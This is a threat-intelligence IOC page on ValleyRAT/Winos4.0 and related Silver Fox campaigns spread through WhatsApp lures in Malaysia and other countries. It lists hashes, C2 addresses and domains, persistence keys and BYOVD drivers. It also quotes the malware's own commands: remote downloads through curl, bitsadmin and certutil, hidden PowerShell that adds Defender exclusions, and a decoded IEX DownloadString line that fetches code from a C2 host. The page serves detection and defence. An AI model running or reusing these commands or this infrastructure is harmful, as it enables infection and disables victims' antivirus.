# IOCs: WhatsApp "Click here to view" ZIP (Winos4.0 / ValleyRAT family)

Sample received on WhatsApp in Malaysia, October 2026. Analysed statically in an isolated Linux VM.

## Files (SHA-256)
| File | SHA-256 | Notes |
|---|---|---|
| `Click here to view10.6_2459.zip` | `550d08c8459ef11e6177309526c0738848d064f7de5c91e0760255fc93159f99` | Lure sent over WhatsApp |
| `Click here to view10.6.vhd` | `053432539a408652f1104aad3c9c4d72d9e68f530f509aa5c982c75451f71958` | Virtual disk inside the ZIP (mounts on double-click, avoids Mark-of-the-Web) |
| `H4752110510.exe` | `c74f55247aa2c72001024bd977c869cb5adce6f8604a4d32329f015b73ae2a49` | Legit signed `KafanInputService.exe` (Shanghai Kafan), used as sideload host |
| `RImE.dLl` (hidden) | `539b49f6ddfa070d25adbd8cd47c10bbba5cacf5bf27fddfe89d96f0c729b2fb` | Fake `rime.dll`, Winos4.0 stager (CAPEv2 YARA `WinosStager`) |
| `71749365-82be-4d58-bc96-c38e3da39ea9.dat` (hidden) | `12b9470634bb7f76419c70ee9a510147cd6bcfce920f2abee5afdd13901b383d` | Encrypted payload/config |
| `hidserv.dll` (hidden) | `2da61980a54cf44081a111e319ee7ab2165743383a4dbb0dca811389779721ba` | Genuine Microsoft file, used as cover |
| resource `VMUI_ES/104` -> `ardrv.sys` | `1c5129b4d63f2d5252b5b02a0a7d655dac3b6eac23dd4ed92b4dd55f243387ff` | Signed OPSWAT driver, abused to kill AV (BYOVD) |
| resource `VMUI_FR/105` -> `ZyArk.sys` | `46883bc25c77678f60c1b836f4c438d87158c9af6b229f533522f635a0d5276e` | Signed Baidu BdArKit driver, abused to kill AV (BYOVD) |

Driver resources are RC4-encrypted; key = ASCII hex string `335D0F051BA4D8B0E57DDC7F66EEB5D9` (stored XOR 0xFC), 16 bytes after hex-decoding.

## Behaviour
- Payload cached in `HKCU\Console\0` / `HKCU\Console\1` (REG_BINARY), loaded into RWX memory.
- Config override `HKCU\Console\IpDate`, final-stage config `HKCU\Software\IpDates_info` (per eSentire).
- Relaunch: `cmd /c start "" rundll32.exe "<dir>\RIME.dll",_vmclientcore@16 "<arg>"`; mutex `7D29FD842A3F8A91A6A69DD152086C2A`.
- Next stage after 60 s via `curl -L -s -o`, `bitsadmin /transfer myJob_%u`, or `certutil -urlcache -split -f`,
  saved in `%TEMP%` as `dd_vcredist_x86_*_vcRuntimeMinimum_x86.exe`.
- Injection with `VirtualAllocEx` + `WriteProcessMemory`.
- C2 address not recovered: the `.dat` is decrypted by virtualised code.

## Second variant: SilverFox KuGou loader (Pelagos Intel, Sep 2026)

Also delivered over WhatsApp in Malaysia. Not analysed by us; IOCs from the Pelagos Intel report.
Lure names follow `PDF_C<digits>_<yyyymmddhhmmss>.zip` and `DOC_<digits>_<yyyymmddhhmmss>.zip`. The ZIP holds an IMG disk image.

| File | SHA-256 | Notes |
|---|---|---|
| `PDF_C2841_20260911100446.zip` | `9f2caeda208c9d729b44f31c32b5e1eeef18d84d6e36b04afe15d894d3809672` | Lure sent over WhatsApp |
| IMG inside the ZIP | `e2bf8b7cd396ee950a5b6911ea098c2e49d4ed002a6c04d5d660ccd4f7d66baa` | Disk image |
| `PDF_C2089_20260911100446.exe` | `f712c2a8b4abf2e299a2b480020333deb0f43364e9686cda78b1243c62e4830d` | Signed KuGou `active_desktop_launcher.exe` (Guangzhou Kugou Technology, thumbprint `757BDD02CBA91CA59C46E2098A5479C1ABC1FDBE`), sideload host |
| `active_desktop_render_x64.dll` | `c1e184615241fe69db3bf4093a22c7c0bf5d6072d2f51e558142b844e871084f` | Unsigned loader posing as DWM helper |

- Staging: `%APPDATA%\Microsoft\Update\`
- Persistence: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` value `MicrosoftUpdate`
- C2: `134.122.155.135:443`, retries about every 3 s
- Config marker `@@RAPID_CFG_START@@`; PDB `D:\buildbot\build1\desktop_screen\build\bin\active_desktop_launcher_x64.pdb`

## October 2026 wave (Malaysia, reported by @a.xydiel on Threads)
Lure message: "Kindly forward the attached Statement of Account to your Finance Manager for review. Please open it on a computer, as full details may not be visible on mobile."
- Lure names: `PDF_FTFWCI_20261009125351.vhd`, `PDF_EXZ12S_20261022110417.zip`/`.vhd`, `20261019-MYS2026Y1019E51AC.zip`/`.vhd`, `20261019.MYS2026Y1019A7F2E.zip`, `101.zip`
- Payload files: `plcc3a.dat`, `eneio64.dat` (run with `rundll32.exe`)
- Persistence and AV evasion: `schtasks /Create /SC ONLOGON /RL HIGHEST` with an empty task name, running hidden PowerShell `Add-MpPreference -ExclusionPath ... -ExclusionProcess 'QtsUpdater.exe','svchost.exe'`; also touches `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet`
- UAC bypass through `CoGetObject` (COM elevation moniker) then `ShellExec`
- One victim's PC stayed quiet for 12 days, then sent the ZIP to every contact
- No hashes published yet

## ABCDoor / RustSL tax-lure campaign (Kaspersky GReAT, 30 Apr 2026)
Same Silver Fox group, targeting India, Indonesia, Russia, South Africa (and Japan in newer loaders). Not yet seen in Malaysia, but it uses the same "Statement of Account" theme.
- Lure archives: `Statement of Account.zip` (MD5 f8371097121549feb21e3bcc2eeea522), `November Statement.zip`, `December Statement.zip`, `CBDT.zip`, `ITD.-.rar`; programs inside: `Review the file.exe`, `BillReceipt.exe`, `statement.exe`, `statement verify .exe`, `Click File.exe`, `GST Suvidha.exe`, `MCA-Ministry.exe`, `RemoteInstaller_<date>_whatsapp.exe`
- ABCDoor: `%LOCALAPPDATA%\appclient\python\pythonw.exe -m appclient`, Run value and task `AppClient` (every minute), `HKCU\Environment\UserInitMprLogonScript`, `HKCU\Software\CarEmu` (`FirstInstallTime`, `InstallChannel`), `%LOCALAPPDATA%\applogs\exception_logs.zip`, `%LOCALAPPDATA%\appclient\111.zip`, `update.bat`; NodeJS dropped to `%USERPROFILE%\.node\node.exe` by the JS loader
- ValleyRAT registry: `HKCU\Console\0`, `HKCU\Console\IpDate` (already detected)
- ValleyRAT C2: 108.187.37.85, 108.187.42.63, 207.56.138.28; ABCDoor C2: 45.118.133.203:5000; payload hosts 154.82.81.205, 154.82.81.192, 108.187.41.221
- Domains: abc.fetish-friends.com, abc.3mkorealtd.com, abc.sudsmama.com, abc.woopami.com, abc.ilptour.com, abc.petitechanson.com, abc.doublemobile.com, mcagov.cc, roldco.com, vnc.kcii2.com, abc.haijing88.com
- Kaspersky publishes MD5 only; the scanner matches SHA-256, so these are detected by name and behaviour.

## Thunder.exe / libexpat.dll variant (CloudSEK, 24 Dec 2025, India)
Income-tax lure PDF opens `ggwk[.]cc`, which serves `tax affairs.exe` (NSIS installer). It drops signed Xunlei `Thunder.exe` beside a fake `libexpat.dll` in `%TEMP%`; the DLL disables Windows Update (`wuauserv`), decrypts `box.ini`, hollows `explorer.exe` (Donut), and runs ValleyRAT. Plugins go in `HKCU\Console\0\d33f351a4aeea5e608853d1a56661059` and are injected into `tracerpt.exe`.
- SHA-256: 77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2 (stage 1), fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19 (stage 2), f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa (stage 3), 068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbced7741245a7ea97c (stage 4)
- C2: b.yuxuanow.top (103.20.195.147), ggwk.cc (45.207.231.94); related tax-themed domains itdd.club, xzghjec.com, gov-a.work/.fit/.club, gvo-b.club, gov-c.club, govk.club, swjc2025bjkb.cn, 2025swmm.cn

## SORVEPOTEL shortcut sample (VirusTotal, first seen 1 Oct 2025)
`malware-whatsapp.rar` (SHA-256 5debd60e266037898bd11f94de614b8411ee2c6b4fd1d54ca0c21578a67614ac, 727 bytes, 27/76 engines, Trend Micro name SORVEPOTEL) contains `DOC-50998906_17774E7A.lnk` (SHA-256 af085f3afbe074c0da6a354be3aabc4677ed03bd0627b4447fb68c6e16089943). The shortcut runs an obfuscated `cmd /D/C "for %Y in (nc) do ..."` that builds `powershell -w hid -enc ...`, which decodes to `IEX (New-Object Net.WebClient).DownloadString('https://zapgrande[.]com/api/itbi/PxlJWZbCuamhhCWjurXBv6K0w1vfVGTw')`. C2: zapgrande.com (109.176.30.141:443).

## References

- CloudSEK, Silver Fox targeting India using tax-themed phishing lures (2025-12-24): https://www.cloudsek.com/blog/silver-fox-targeting-india-using-tax-themed-phishing-lures

- Kaspersky Securelist, Silver Fox uses the new ABCDoor backdoor (Apr 2026): https://securelist.com/silver-fox-tax-notification-campaign/119575/

- LOLDrivers, vulnerable and malicious driver list used by the scanner (`data/loldrivers.csv`): https://www.loldrivers.io
- LOLRMM, remote-management tools abused by attackers: https://lolrmm.io
- Elastic YARA rule for Winos (Elastic License 2.0, linked not copied): https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Winos.yar
- @a.xydiel on Threads, 22 and 24 Oct 2026: https://www.threads.com/@a.xydiel/post/DeyKrHwk2D6 and https://www.threads.com/@a.xydiel/post/De4hGk6E7sg
- Pelagos Intel, SilverFox in the Desktop (2026-09-27): https://research.pelagos-intel.com/silverfox-in-the-desktop
- eSentire, Winos4.0 online module staging component: https://www.esentire.com/blog/winos4-0-online-module-staging-component-used-in-cleversoar-campaign
- The Star, 29 Sep 2026: https://www.thestar.com.my/tech/tech-news/2026/09/29/malaysians-report-being-targeted-by-malware-file-sent-through-whatsapp
